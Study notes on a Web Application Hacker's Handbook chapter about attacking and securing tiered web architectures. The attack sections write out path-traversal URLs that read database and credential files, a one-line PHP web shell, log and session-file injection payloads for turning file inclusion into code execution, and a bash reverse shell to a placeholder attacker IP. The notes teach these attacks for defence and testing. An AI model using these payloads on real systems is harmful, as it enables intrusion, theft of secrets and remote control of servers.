**Note:** This is the twelfth installment of my notes and reflections from The Web Application Hacker's Handbook. These reminders are neither exhaustive nor definitive—they're simply a personal tool to help me absorb, understand, and organize new material in a way that works for me.

# Attacking Application Architecture:

When assessing the security of a web application, testers often focus on *individual vulnerabilities*—SQL injection, authentication flaws, XSS, and similar issues. While these defects are important, the *overall architecture of the application* is just as critical and is frequently overlooked.

Modern applications are rarely a single monolithic program. Instead, they are composed of multiple layers and components that interact with one another. If these layers are *poorly segregated or insufficiently protected,* a vulnerability in one part of the system can allow an attacker to move laterally and compromise the entire application stack. For example, a seemingly minor flaw in the presentation layer (such as a file upload vulnerability or template injection) might allow an attacker to execute code that ultimately gains access to backend services, internal APIs, or the application's database. Once one tier falls, the others often follow.

Another important risk arises when *multiple applications share the same infrastructure.* In shared environments—such as hosting platforms, container clusters, or cloud services—a vulnerability in one application may allow attackers to compromise neighboring applications or even the underlying platform itself. In these situations, one compromised tenant can become a launching point for attacks against other customers. The growth of *cloud computing and multi-tenant platforms* has amplified these risks. Organizations now commonly deploy applications inside shared environments where infrastructure, orchestration tools, and sometimes even runtime components are reused across multiple services. Improper isolation at any of these layers can expose entire ecosystems to attack.

## Tiered Architectures:

Most modern web applications are built using a **multitier architecture**, where different aspects of the application are separated into logical layers. These layers typically handle distinct responsibilities such as the user interface, application logic, and data storage. Separating functionality in this way helps developers manage complexity and makes systems easier to maintain and scale. However, this same separation can also introduce *security boundaries* that attackers may attempt to cross.

A typical *three-tier architecture* consists of the following components:

1. **Presentation Layer:**

This layer is responsible for the **user interface** and communication with the client. It usually includes:

- Web servers (e.g., Nginx, Apache)

- Frontend frameworks (React, Vue, Angular)

- Server-side rendering engines

- Template engines (Jinja2, Thymeleaf, Handlebars)

This layer processes HTTP requests and responses, handles session state, and renders content for users. Because it directly interacts with user input, the presentation layer is often where attackers first discover vulnerabilities.

2. **Application Layer:**

The application layer contains the **core logic of the system.** It processes requests received from the presentation layer and performs the actions required to fulfill them. Typical responsibilities include:

- Authentication and authorization

- Business rules and workflows

- API endpoints

- Input validation

- Integration with backend services

Common technologies used here include:

- Node.js / Express

- Java Spring Boot

- ASP.NET Core

- Python Django / Flask

- Ruby on Rails

- Go web frameworks

If an attacker compromises this layer, they often gain the ability to manipulate application behavior or interact directly with backend resources.

3. **Data Layer:**

The data layer is responsible for **storing and retrieving application data.** This typically includes:

- Relational databases (PostgreSQL, MySQL, SQL Server)

- NoSQL databases (MongoDB, Cassandra)

- Caching systems (Redis, Memcached)

- Object storage systems

- Message queues and event stores

The application layer interacts with the data layer through database drivers, APIs, or ORM frameworks. An ORM (Object-Relational Mapping) framework is a tool that helps developers interact with relational databases using object-oriented programming languages, simplifying tasks like creating, reading, updating, and deleting data without writing SQL queries directly. Popular ORM frameworks include Hibernate for Java, Entity Framework for .NET, and Django ORM for Python. Compromising this layer can lead to *data exfiltration, corruption, or privilege escalation* within the system.

### Example: Fine-Grained Enterprise Architecture

Large enterprise applications frequently use a more granular architectural model where each function is implemented as its own component or framework layer. A traditional Java enterprise stack might include something similar to the following:

1. **Web Server / Reverse Proxy:**

Handles incoming HTTP traffic and routing. Examples:

- Nginx

- Apache HTTP Server

- HAProxy

- Cloud load balancers

2. **Application Server:**

Hosts and executes the application runtime. Examples:

- Apache Tomcat

- Jetty

- WildFly / JBoss

- GlassFish

3. **Presentation Framework:**

Responsible for rendering views and handling user interactions. Examples:

- Spring MVC

- Jakarta Faces (JSF)

- Thymeleaf

- modern equivalents such as REST controllers serving frontend SPAs. A frontend SPA (Single Page Application) refers to a web application that loads a single HTML page and dynamically updates its content using JavaScript, allowing for a smoother user experience without full page reloads. This approach enhances performance and interactivity, making the application feel more like a native app.

4. **Authentication and Authorization Layer:**

Implements identity management and access control. Examples:

- Spring Security

- OAuth / OpenID Connect providers

- Keycloak

- JAAS (legacy Java authentication framework)

5. **Application Framework:**

Provides structural components used by developers to build the application. Examples:

- Spring Framework

- Jakarta EE

- Micronaut

- Quarkus

6. **Business Logic Layer:**

Contains the actual business rules and application behavior. Historically this layer often used Enterprise Java Beans (EJB). Modern architectures more commonly use:

- Service classes

- Microservices

- Domain-driven design components

7. **Object-Relational Mapping (ORM):**

ORM frameworks translate application objects into database queries. Examples:

- Hibernate

- JPA

- MyBatis

8. **Database Connectivity Layer:**

Responsible for communicating with the database engine. Examples:

- JDBC drivers

- Connection pools such as HikariCP

9. **Database Server:**

The backend storage engine where persistent data resides. Examples:

- PostgreSQL

- MySQL

- Oracle Database

- Microsoft SQL Server

**Why Multitier Architectures Exist?**

Separating an application into tiers provides several advantages over a monolithic design.

*Improved Manageability:* Breaking a complex system into smaller components makes the codebase easier to understand, test, and maintain.

*Parallel Development:* Different teams can work on different components simultaneously without needing detailed knowledge of the entire system. For example:

- frontend developers build UI components

- backend developers implement APIs

- database engineers manage schemas and performance

*Reusability:* Well-defined modules can often be reused across multiple applications. Authentication systems, API gateways, and logging frameworks are common examples of reusable components.

*Technology Flexibility:* Individual layers can be replaced or upgraded without rewriting the entire application. For example:

- swapping MySQL for PostgreSQL

- replacing a legacy authentication module with OAuth

- migrating a frontend from server-side rendering to a single-page application

*Potential Security Benefits:* When implemented correctly, layered architectures can *limit the impact of vulnerabilities.* Security boundaries can be enforced between layers using mechanisms such as:

- network segmentation

- service authentication

- strict API interfaces

- role-based access control

- container isolation

However, when these boundaries are weak or incorrectly implemented, attackers may be able to *pivot from one layer to another,* turning a small vulnerability into a full system compromise. Understanding how these tiers interact is therefore an essential step in identifying architectural weaknesses and exploiting them during a security assessment.

## Attacking Tiered Architectures:

Multitiered architectures are designed to improve maintainability, scalability, and modularity. However, if the separation between tiers is poorly designed or incorrectly enforced, the architecture itself can introduce *serious security weaknesses.* From an attacker’s perspective, understanding how the different layers interact is extremely valuable. Each layer often performs specific security functions such as:

- authentication

- authorization

- input validation

- business rule enforcement

- data storage and retrieval

If these responsibilities are distributed incorrectly, security controls may *break down at the boundaries between tiers.* In practice, weaknesses in tiered architectures often enable three broad categories of attacks:

**Exploiting Trust Relationships Between Tiers:**

Different layers of the application frequently *trust other layers to perform security-critical tasks correctly.* If this trust is abused or violated, attackers can pivot from one tier into another.

**Circumventing Security Boundaries:**

If tiers are not properly isolated from one another, a vulnerability in one layer may allow attackers to *bypass security mechanisms implemented in another layer.*

For example, a weakness in the presentation layer might allow an attacker to interact directly with backend services that were intended to be accessible only through the application layer.

**Attacking the Supporting Infrastructure:**

After compromising one layer, attackers may attempt to *directly attack the infrastructure supporting other tiers,* such as internal services, databases, container environments, or operating systems. This often allows attackers to expand their foothold and compromise the entire application environment.

We will examine these attack patterns in more detail, beginning with one of the most common architectural weaknesses: trust relationships between tiers.

### Exploiting Trust Relationships Between Tiers:

A classic example of this trust relationship occurs between the *application layer and the database.* Most applications connect to the database using a *single service account* that has broad privileges over the application's data. For example, the account may be able to:

- read all records

- insert new data

- modify existing records

- delete records

The database assumes that the application has already verified whether the user making the request is authorized to perform the action. However, if an attacker exploits a *SQL injection vulnerability,* they may be able to submit arbitrary SQL queries through the application. From the database’s perspective, these queries appear to come from the trusted application account. As a result, the attacker may gain access to *all data available to the application,* regardless of the permissions of the original user. This is why SQL injection often leads to full database compromise.

**Example: Operating System Trust**

Similar trust relationships frequently exist between the **application layer and the underlying operating system.** Web applications often run under service accounts that possess significant privileges, including the ability to:

- access sensitive files

- execute system commands

- interact with system services

- write to application directories

The operating system assumes that the application will use these privileges responsibly. However, if an attacker discovers a *command injection vulnerability* or a remote code execution flaw, they may be able to execute arbitrary commands using the application's privileges. In many cases, this allows the attacker to fully compromise the server hosting the application. Once this happens, the attacker may gain access to:

- configuration files

- database credentials

- internal network services

- other applications hosted on the same system

**Cascading Failures Between Tiers:**

Trust relationships can also cause unexpected problems when **programming errors occur within one layer.** A bug in the application logic may trigger incorrect behavior in other tiers that blindly trust the application's requests.

For example, earlier chapters discussed a *race condition vulnerability* in which concurrent requests caused the application to mishandle account data. Because the database simply executed the queries it received, it returned *account information belonging to the wrong user.* The database itself was not vulnerable—the problem arose because it trusted the application layer's instructions.

**Logging and Forensic Limitations:**

Trust relationships can also complicate *incident investigation and forensic analysis.* When one tier blindly trusts another, its logs typically record only the trusted system component that issued the request, not the original user responsible for the action. For example, during a SQL injection attack:

- the database logs may record every malicious query

- however, they will appear to originate from the application's database account

To determine which user triggered the activity, investigators must correlate events across multiple logging systems. This typically requires combining:

- web server logs

- application logs

- database logs

- authentication logs

If logging is incomplete or poorly synchronized, identifying the true source of the attack may become extremely difficult. Understanding these trust relationships is critical when assessing a web application's architecture. When a vulnerability allows an attacker to manipulate a trusted component, the **implicit trust built into the architecture can dramatically amplify the impact of the attack.**

## Subverting Other Tiers:

In a well-designed multitier architecture, each tier should be *logically and physically separated* from the others. This separation prevents a compromise in one layer from automatically granting control over the rest of the system. However, in many real-world deployments, these boundaries are weak or nonexistent.

If an attacker successfully compromises one tier of an application—such as the web server or application layer—and the architecture lacks proper segregation, they may be able to *directly interfere with the responsibilities of other tiers.* This can allow them to bypass security protections that those tiers are responsible for enforcing. For example:

- The application tier may enforce access control rules.

- The database tier may store sensitive records.

- A cryptographic service may manage encryption keys.

If the attacker gains direct access to these components because they share the same host or network environment, they may circumvent the intended control mechanisms entirely. This situation commonly arises when *multiple tiers are deployed on the same physical machine,* which is often done to reduce infrastructure costs or simplify deployment. While this arrangement may be convenient, it removes many of the defensive barriers that layered architectures are meant to provide. Once an attacker gains control of one component in such an environment, they may be able to interact directly with files, processes, or services belonging to other tiers.

### Accessing Decryption Algorithms:

Many modern applications store sensitive data in encrypted form to reduce the consequences of a data breach. Regulatory standards and compliance frameworks frequently require encryption for certain types of information. Examples include:

- payment card information (PCI DSS requirements)

- personal identifying information (PII)

- financial data

- internal authentication secrets

For some data types, however, encryption must be *reversible.* The application needs to recover the original plaintext value in order to perform its intended function. Common examples include:

- security questions used by help desks for identity verification

- payment card numbers required for payment processing

- API keys or credentials used to access external services

To support this functionality, applications often use **two-way (symmetric) encryption**, where the encrypted value can be decrypted using a secret key.

#### A Common Architectural Mistake:

A frequent design flaw occurs when **encryption keys and encrypted data are stored within the same tier.** This situation often arises when encryption is introduced into an existing system as an afterthought. Developers may add encryption routines directly into the data layer without significantly restructuring the application architecture. A typical flawed configuration may look like this:

- Encrypted data stored in the database

- Encryption routines located in database procedures or application libraries

- Encryption keys stored in configuration files accessible to the same system

At first glance, this appears to provide protection. Even if the database is accessed directly, the stored values appear unreadable. However, if an attacker compromises the tier responsible for storing or processing the data—such as through a *SQL injection vulnerability*—they may be able to locate and execute the same decryption routines used by the application. For example, the attacker might:

- identify stored procedures used for encryption and decryption

- extract encryption keys from configuration files

- execute database functions that automatically decrypt sensitive values

Once this happens, the encryption layer effectively becomes meaningless.

An important principle to understand is that **encryption cannot protect data from the application that legitimately uses it.** If the application itself has the ability to decrypt sensitive information, then an attacker who fully compromises the application will eventually be able to do the same. For example, an attacker who gains remote code execution within the application layer could:

- inspect application memory

- read configuration files

- extract encryption keys

- invoke decryption routines directly

In other words, encryption primarily protects data **at rest** from unauthorized external access. It does not prevent attackers from retrieving plaintext values once they gain control of the application environment. Because of these limitations, secure architectures attempt to introduce additional barriers between encrypted data and the mechanisms used to decrypt it. Common defensive strategies include:

- storing encryption keys in *hardware security modules (HSMs)* or dedicated key management systems

- using *external key management services* (such as cloud KMS platforms)

- restricting access to decryption functions through strict authentication controls

- isolating sensitive cryptographic operations within separate services

Even with these precautions, however, a sufficiently powerful compromise of the application environment can still expose decrypted data. From an attacker’s perspective, the key lesson is simple:

**If the application can decrypt the data, there is almost always a path to the decryption mechanism once the application itself is compromised.**

### Using File Read Access to Extract MySQL Data:

Many smaller web applications are deployed using a classic *LAMP stack,* where a single server runs the following components:

- *Linux* – the operating system

- *Apache* – the web server

- *MySQL* – the database server

- *PHP* – the server-side scripting language

In this architecture, all major components of the application reside on the *same physical system.* While this configuration is simple and inexpensive to deploy, it can create dangerous security implications if the boundaries between components are not carefully enforced. One particularly problematic situation arises when the web application has **direct file-system access to the database storage files.**

In many default configurations, the database engine stores its data in files located on disk, often within directories such as:

```
/var/lib/mysql/
```

If the web server process runs with permissions that allow it to read files within this directory, then any vulnerability that exposes **arbitrary file read access** may allow an attacker to retrieve raw database data directly from the filesystem. In this scenario, the attacker completely bypasses the database’s built-in security controls.

Consider an application feature that allows users to select a visual theme or skin. For example, users may be able to choose a **CSS file** to customize the interface. The application might load the file dynamically based on a parameter supplied by the user. A simplified example might look like this:

```
https://example.com/skin.php?style=dark.css
```

The server-side code might read the requested file from disk and return it to the user. If the application does not properly validate the filename, an attacker may be able to exploit a **path traversal vulnerability** using sequences such as:

```
../
```

An attacker might submit a request such as:

```
https://example.com/skin.php?style=../../../../var/lib/mysql/appdb/users.frm
```

or

```
https://example.com/skin.php?style=../../../../var/lib/mysql/appdb/users.MYD
```

If the web server process has permission to read these files, the application may return the raw database file contents to the attacker.

**Why This Bypasses Database Security?**

Even if the database is configured securely, these protections may become irrelevant. The database server normally enforces protections such as:

- authentication for database users

- table-level privileges

- restricted queries

- limited database accounts used by the application

However, if an attacker can read the underlying database files directly from disk, these protections no longer apply. Instead of interacting with the database through SQL queries, the attacker simply **extracts the raw storage files.** Depending on the database engine and storage format, these files may contain:

- usernames

- password hashes

- application secrets

- session tokens

- payment data

Although the format may not always be immediately readable, various tools and scripts exist that can parse MySQL storage files and extract useful information.

Once an attacker gains arbitrary file read access on a server, additional opportunities often appear. For example, attackers frequently attempt to retrieve sensitive configuration files such as:

```
/var/www/html/config.php
/var/www/app/.env
/var/www/html/wp-config.php
```

These files often contain:

- database credentials

- API keys

- encryption keys

- internal service endpoints

With these credentials, the attacker may be able to connect directly to the database server using legitimate access.

**File Write Attacks:**

If the vulnerability allows **file write access** in addition to file reading, the situation becomes even more serious. An attacker may attempt to write files into locations that are accessible through the web server. For example:

- uploading a malicious PHP script

- modifying an existing configuration file

- writing files into a web-accessible directory

A simple web shell might look like:

```
<?php system($_GET['cmd']); ?>
```

If placed inside a web-accessible directory, this could allow the attacker to execute arbitrary system commands via the browser. This technique frequently leads to **remote command execution on the server.**

**Is This Attack Still Feasible Today?**

Modern deployments have introduced several changes that reduce the likelihood of this exact scenario. Today it is more common to run components in **separate containers or virtual machines**, such as:

- Docker containers

- Kubernetes pods

- managed database services

This often prevents the web server from accessing database storage files directly.

Cloud platforms frequently host databases on **separate infrastructure**, meaning the application server cannot access the database filesystem at all. Examples include managed services such as:

- AWS RDS

- Google Cloud SQL

- Azure Database

Also, many systems now restrict the web server user (such as ```www-data```) from reading database storage directories. However, despite these improvements, similar vulnerabilities still appear frequently in real-world applications. Common modern variants include:

- **LFI (Local File Inclusion)** revealing application secrets

- reading ```.env``` files containing database credentials

- retrieving API tokens used by backend services

- extracting cloud service credentials

- accessing container secrets or mounted volumes

In other words, while the *exact MySQL file extraction scenario is less common today,* the underlying principle remains extremely relevant: **If an attacker can read arbitrary files on the server, they can often recover secrets that lead to full system compromise.**

### Using Local File Inclusion to Execute Commands:

Many programming languages provide mechanisms for **including external files** within a script. These features are commonly used to reuse code, templates, or configuration files. For example, PHP contains functions such as:

```
include()
require()
include_once()
require_once()
```

These functions load a file from the filesystem and **execute its contents as part of the current script.** If an application allows an attacker to control the file path used in an inclusion function, this can lead to a *Local File Inclusion (LFI)* vulnerability.

At first glance, LFI may appear less dangerous than *Remote File Inclusion (RFI),* since the attacker cannot directly load arbitrary files from an external server. However, LFI can still lead to serious consequences. An attacker may be able to:

- read sensitive files (e.g., ```/etc/passwd```)

- retrieve application configuration files

- access credentials and secrets

- expose source code

While these actions primarily lead to *information disclosure,* LFI vulnerabilities can sometimes be escalated into *arbitrary command execution* by including files whose contents the attacker partially controls.

#### Turning File Inclusion into Code Execution:

The key idea behind many LFI-to-RCE attacks is simple:

1. Find a file that the attacker can influence.

2. Insert malicious code into that file.

3. Force the application to **include and execute** the file.

Several system components may store attacker-controlled data in files, including:

- web server access logs

- application logs

- uploaded files

- session storage files

- temporary files

If an attacker can inject code into one of these files, and then trigger the LFI vulnerability to include it, the injected code may be executed by the server.

Consider an application that loads language or regional preference files based on a parameter:

```
http://eis/mdsecportal/prefs/preference_2.php?country=en-gb
```

Internally, the code might look something like this:

```
include("languages/" . $_GET['country']);
```

If the input is not validated properly, an attacker could manipulate the parameter to include arbitrary files on the server. For example:

```
http://eis/mdsecportal/prefs/preference_2.php?country=../../../../etc/passwd
```

This would cause the server to attempt to include the ```/etc/passwd``` file. Although this file does not contain executable PHP code, its contents could still be exposed to the attacker.

#### Log File Injection Technique:

One common escalation technique involves **injecting PHP code into web server log files.** When a user sends a request to a web server, details about the request are often recorded in access logs. For example, an attacker might send a request containing PHP code in the URL:

```
http://target.com/<?php system($_GET['cmd']); ?>
```

If the server logs the request path, the log file may now contain the injected PHP code. The attacker can then attempt to include the log file via the LFI vulnerability:

```
http://target.com/vulnerable.php?file=/var/log/apache2/access.log
```

If the log file is included and interpreted by PHP, the injected code may be executed.

#### PHP Session File Injection:

A particularly interesting technique involves **PHP session files.** In many PHP configurations, session data is stored as files on the server. These files typically reside in directories such as:

```
/var/lib/php/sessions/
/tmp/
```

Each session file is named using the user's session identifier. For example:

```
/var/lib/php/sessions/sess_9ceed0645151b31a494f4e52dabd0ed7
```

The contents of this file store the session variables associated with the user. An example session file might contain something like:

```
logged_in|i:1;
id|s:2:"24";
username|s:11:"manicsprout";
nickname|s:3:"msp";
privilege|s:1:"1";
```

**Additional Notes:**

PHP stores session variables using a simple serialization format. Each entry generally follows this structure:

```
variable_name | data_type : length : "value"
```

For example:

```
username|s:11:"manicsprout";
```

This means:

- ```username``` → variable name

- ```s``` → string type

- ```11``` → string length

- ```"manicsprout"``` → stored value

Another example:

```
logged_in|i:1;
```

This indicates:

- variable name: ```logged_in```

- ```i``` → integer

- value: ```1```

The session file is therefore a **plain text representation of session variables.**

##### Exploiting Session Files for Code Execution:

If the application stores **user-controlled data** inside session variables, an attacker may be able to inject PHP code into the session file. For example, suppose the application allows users to choose a nickname. The attacker sets their nickname to:

```
<?php passthru('id'); ?>
```

This code instructs PHP to execute the ```id``` command on the system. The session file may now contain something like:

```
nickname|s:22:"<?php passthru('id'); ?>";
```

Normally this file is never executed—it is simply read by PHP's session system. However, if an LFI vulnerability allows the attacker to **include the session file**, the server may interpret the injected PHP code.

**Additional Notes: What About a Reverse Shell?**

You absolutely could try that. The reason examples often use something tiny like ```<?php passthru('id'); ?>``` instead of a full reverse shell is mostly *practicality and reliability* during exploitation. First, attackers usually start with a *simple proof-of-execution.* A command like ```id```, ```whoami```, or ```uname -a``` is short, predictable, and confirms that the inclusion actually executes PHP code. If that works, you know the path is correct, the include works, and PHP parsing is happening. Only then do you escalate to something heavier like a shell.

Second, **session files have formatting constraints.** Remember the serialized entry:

```
nickname|s:22:"value";
```

If you insert a long reverse shell payload, the **string length field must match exactly**, or PHP may break the session parsing. A short payload is easier to fit without corrupting the file.

Third, reverse shells can fail for environmental reasons:

- outbound firewall rules

- wrong attacker IP/port

- missing binaries (```bash```, ```nc```, etc.)

- disabled PHP functions (```exec```, ```system```, ```passthru```)

And there’s another well-known trick: instead of stuffing a huge payload into the session, attackers often execute something like:

```
<?php system($_GET['cmd']); ?>
```

Then they control everything via the URL:

```
vuln.php?cmd=id
vuln.php?cmd=ls
vuln.php?cmd=bash+-c+'bash+-i+>&+/dev/tcp/ATTACKER_IP/4444+0>&1'
```

Much cleaner. Overall, a reverse shell is totally possible, but experienced attackers usually *probe the execution first* before unleashing the bigger payload.

##### Triggering the Attack:

The attacker then attempts to include the session file using the vulnerable parameter:

```
http://eis/mdsecportal/prefs/preference_2.php?country=../../../../var/lib/php/sessions/sess_9ceed0645151b31a494f4e52dabd0ed7
```

When the server executes the include statement, it loads the session file. Because the file now contains PHP code, the interpreter executes it. As a result, the attacker’s command runs on the server. In this example, the ```id``` command prints information about the user account running the web server process. This confirms *remote command execution.*

**Additional Notes: What About the ```%00``` in the Original Example?**

Older versions of PHP had a **null byte injection** issue. Attackers could append ```%00``` (a null byte) to terminate a string early in the underlying C functions used by PHP. For example:

```
file.php?file=session.txt%00.php
```

The ```.php``` portion might be ignored internally, allowing attackers to bypass extension filters. Modern PHP versions have *fixed this vulnerability,* so this trick no longer works in current environments.

Parts of this attack chain are less common today, but the *core concept is still very relevant.* Changes that reduce the likelihood include:

- improved PHP session handling

- stricter file permissions

- hardened include logic

- containerized deployments

However, variations of this attack still appear regularly in penetration tests. Modern equivalents often involve:

- including log files containing injected payloads

- including uploaded files

- including temporary files

- including application cache files

In short, *LFI is rarely the end of the story.* Skilled attackers almost always look for ways to transform it into *remote code execution.*

#### Field Notes for the Curious Attacker:

1. **Never Underestimate a “Minor” Vulnerability:**

When analyzing a vulnerability, avoid judging it solely by its *immediate impact.* Many successful attacks begin with weaknesses that appear trivial at first glance. A small flaw may only provide:

- limited file read access

- partial information disclosure

- minor input manipulation

- restricted command execution

However, when viewed in the context of the *entire application architecture,* these weaknesses can often be chained together to produce far more serious consequences. This is where architectural awareness becomes critical. By understanding the *trust relationships between tiers,* an attacker may be able to:

- bypass security checks performed elsewhere in the system

- access resources that were assumed to be protected

- manipulate backend components that trust upstream services

In many real-world intrusions, the initial vulnerability would not have been catastrophic on its own. The real damage occurred because the attacker leveraged *implicit trust between system components* to expand the scope of the attack.

2. **Pivot Through the Infrastructure:**

If you manage to achieve *arbitrary command execution* on any part of the application infrastructure, your focus should immediately broaden beyond the vulnerable component. A compromised application server is often only the *first stepping stone.* From this foothold, consider whether the compromised system can:

- initiate outbound network connections

- access internal services

- authenticate to other servers

- interact with backend databases or storage systems

If these capabilities exist, the attacker may attempt to pivot deeper into the environment by directly targeting other components of the infrastructure. Possible next steps might include:

- connecting to internal database servers

- probing internal APIs or management interfaces

- interacting with message queues or cache systems

- enumerating network shares or container runtimes

- exploiting operating system–level weaknesses

In modern environments, attackers frequently move laterally from an initial compromise to other internal services, gradually expanding their control over the system.

### Securing Tiered Architectures:

When designed and implemented carefully, a multitier architecture can significantly *limit the impact of security breaches.* The goal of tiered design is not merely organizational convenience, but *containment.*

In insecure configurations—such as the previously discussed LAMP deployment where all components run on a single machine—the compromise of any single layer often results in the compromise of the entire application. If an attacker gains control of the web application, they may immediately gain access to:

- the database files

- configuration secrets

- operating system resources

- other hosted applications

By contrast, a properly designed architecture attempts to *isolate components* so that the failure of one layer does not automatically grant control over others. In such systems, compromising a single tier may allow limited access to certain resources, but the damage can potentially be *contained within that tier.* Achieving this level of containment requires careful control over how different layers interact and how much they trust each other.

#### Minimizing Trust Between Tiers:

A key principle in secure architecture is that *each tier should defend itself.* No component should assume that another layer has already performed all necessary security checks. Instead, each layer should enforce its own protections wherever possible. Below are several examples of how this principle can be applied.

##### Application Server Controls:

The application server can implement *fine-grained access controls* over specific resources and URL paths. For example, the server may enforce rules such as:

- restricting the ```/admin``` path to authenticated administrative users

- blocking access to internal API endpoints from external networks

- limiting which users can access sensitive scripts or management interfaces

Many application frameworks allow security policies to be applied directly to URL routes or controller actions. This ensures that unauthorized requests are rejected *before they reach deeper layers of the system.* Such controls can reduce the impact of certain access control vulnerabilities within the application logic itself. Even if a flaw exists in the application code, the application server may still block unauthorized requests at an earlier stage.

##### Database-Level Access Controls:

The database tier can also enforce its own security boundaries instead of trusting the application completely. A common mistake is to use a *single database account* with broad privileges for all application activity. A more secure design uses multiple database accounts with carefully limited permissions. For example:

- Unauthenticated users may interact with the database using a *read-only account* that can access only public information.

- Authenticated users may use accounts with *limited write privileges* for specific data sets.

- Administrative actions may require a separate, higher-privileged account.

By enforcing privilege separation at the database level, the impact of vulnerabilities such as *SQL injection* can be significantly reduced. Even if an attacker successfully injects SQL commands, the damage may be limited to the permissions granted to that particular database account.

##### Least-Privilege Operating System Accounts:

Every application component should run under an operating system account that has *only the permissions necessary for its normal operation.* This is known as the *principle of least privilege.* For example:

- the web server should not have access to database storage files

- application services should not run with administrative privileges

- background services should be restricted to specific directories

Applying least privilege at the operating system level helps mitigate vulnerabilities such as:

- command injection

- arbitrary file access

- directory traversal

- local privilege escalation attempts

In a well-hardened system, even if an attacker manages to exploit a vulnerability within an application component, the compromised process may have *very limited capabilities,* preventing further escalation.

#### Segregating Application Components:

A key goal of secure architecture is to ensure that different components of the application cannot interact with one another in *unintended or uncontrolled ways.* In practice, this often requires more than logical separation inside the codebase. Effective segregation frequently involves *separating components at the system and network levels.*

In some environments, this means running different tiers on *separate servers, virtual machines, or containers.* Doing so ensures that the compromise of one tier does not automatically grant access to other critical resources. The following examples illustrate how this principle can be applied in practice.

##### File System Isolation Between Tiers:

Different tiers of an application should not have direct file-system access to resources belonging to other tiers. For example, the application layer should never have permission to read or write the files that store database data. Instead, the application should interact with the database *only through the database service itself,* using authenticated queries. This ensures that even if the application layer becomes compromised—for example through command injection or remote code execution—the attacker cannot simply read the database files directly from disk.

Instead, they must interact with the database through its intended interface, which allows the database to enforce its own authentication and access control mechanisms. This principle also applies to other sensitive resources, such as:

- application configuration files

- encryption keys

- credential storage

- internal service data

Restricting file-system access helps prevent vulnerabilities such as *local file inclusion, arbitrary file read, or directory traversal* from escalating into full data disclosure.

##### Network-Level Isolation:

Another important layer of protection involves restricting how different infrastructure components communicate over the network. Firewalls, security groups, or internal network policies can be used to limit which services are allowed to communicate with one another. For example, consider a deployment where:

- the web server hosts the application logic

- the database server stores application data

In a well-designed environment, the database server might allow inbound connections *only from the application server,* and only on the port used by the database protocol (such as TCP port 3306 for MySQL). This configuration prevents other systems—including external hosts—from connecting directly to the database.

**Additional Notes:**

Couldn't an attacker still use the allowed database port for malicious activity? In some situations, yes.

If an attacker gains command execution on the application server, they may still be able to interact with the database through its permitted port. They might even attempt to exploit database features such as stored procedures or functions. However, the purpose of network-level filtering is *not to prevent all possible attacks.* Instead, it aims to *limit the attack surface and prevent unintended communication paths.* For example, this restriction prevents an attacker from:

- directly attacking the database server's operating system services

- accessing administrative services running on other ports

- using the compromised server to scan or attack unrelated internal systems

- connecting to backup interfaces, management ports, or replication services

In other words, network segmentation helps *contain the scope of a compromise,* even if it cannot eliminate all possible attack paths. Also, attackers sometimes attempt to establish *reverse shells or covert channels* through allowed ports. However, such attempts may still fail due to protocol validation, firewall inspection, or service-specific restrictions.

#### Applying Defense in Depth:

Even when tiers are carefully separated, additional defensive measures are necessary to further reduce the risk of system-wide compromise. This strategy is commonly referred to as *defense in depth.* Instead of relying on a single protective mechanism, multiple layers of security controls are implemented across the architecture. If one control fails, others remain in place to slow or contain the attack. The following examples illustrate how this principle can be applied within a multitier environment.

##### Hardening Every Layer:

All layers of the technology stack on every server should be *properly hardened and regularly patched.* This includes:

- operating systems

- web servers

- application frameworks

- database engines

- third-party libraries

If a server is poorly secured at the operating system level, an attacker who exploits an application vulnerability—such as command injection—may be able to escalate privileges and fully compromise the host. Once administrative access is obtained, the attacker may then pivot to other systems across the network. By contrast, if the underlying system is carefully hardened and kept up to date, the attacker’s ability to escalate privileges may be significantly reduced. In such cases, the attack may remain limited to the compromised application process.

##### Protecting Sensitive Data:

Sensitive information stored anywhere within the architecture should be protected using appropriate cryptographic mechanisms. Examples of sensitive data include:

- user credentials

- authentication tokens

- personal information

- payment card data

For user passwords, modern systems typically use *salted cryptographic hashes* rather than reversible encryption. This ensures that even if the database is compromised, the original passwords cannot be easily recovered.

Other data that must be retrieved in plaintext—such as payment information or API keys—may require encryption using secure key management practices. Where possible, built-in security mechanisms should be used to protect secrets stored within application components. For example, some frameworks allow sensitive configuration values—such as database connection strings—to be encrypted within configuration files. Historically, platforms such as ASP.NET supported encrypted configuration sections within the ```web.config``` file, protecting database credentials from being exposed through simple file disclosure vulnerabilities. Modern environments extend this concept further through:

- environment variable protection

- dedicated secrets management systems

- hardware-backed key storage

- cloud key management services

These mechanisms help ensure that even if parts of the application infrastructure are compromised, sensitive information cannot be easily extracted.

#### Shared Hosting and Application Service Providers:

Many organizations rely on *external providers* to help deliver their web applications to the public. These arrangements range from simple infrastructure hosting to fully managed application platforms. At the simplest level, a company may rent access to a web server or database server and deploy its own application there. At the other extreme, organizations may rely on *Application Service Providers (ASPs)* that actively maintain, configure, and sometimes even update the application on the organization's behalf.

These models are especially attractive to small businesses that lack the expertise or resources to build and maintain their own infrastructure. However, even large organizations sometimes use these services to deploy specific applications quickly and cost-effectively. Because hosting providers typically serve *many customers simultaneously,* they often run multiple customer applications on the same physical infrastructure or on tightly connected systems. This introduces several security risks that must be considered.

When multiple organizations share the same hosting infrastructure, the security of one customer may become dependent on the security of others. Two important threat scenarios arise from this situation.

##### Malicious Customers:

A malicious customer of the hosting provider may attempt to interfere with other customers' applications or access their data. For example, if isolation between hosted environments is weak, an attacker might exploit configuration flaws, shared resources, or vulnerabilities in the hosting platform to gain access to neighboring applications.

Even if all customers behave honestly, the presence of *poorly secured applications* can still create risk. If another customer deploys an application with serious vulnerabilities, attackers may exploit that application to compromise the shared infrastructure. Once the underlying system is compromised, the attacker may attempt to pivot into other hosted environments.

##### Mass Attacks Against Shared Hosts:

Shared hosting systems are particularly attractive targets for attackers seeking to compromise large numbers of websites quickly. For example, attackers interested in website defacement often focus on shared hosting servers. By compromising a single server, they may gain the ability to *alter the content of dozens or even hundreds of websites* hosted on the same machine. This is why shared hosting environments are frequently targeted by automated attacks and opportunistic intrusion attempts.

##### Virtual Hosting:

One common way hosting providers support multiple websites on the same server is through *virtual hosting.* In this configuration, a single web server responds to requests for multiple domain names. Each domain is mapped to a separate website, even though all requests ultimately arrive at the same IP address.

This mechanism relies on the ```Host``` header, which became mandatory in HTTP/1.1. When a browser sends an HTTP request, it includes the domain name from the URL in the ```Host``` header. The server uses this header to determine which website the client is attempting to access. For example:

```
GET /index.html HTTP/1.1
Host: wahh-appl.com
```

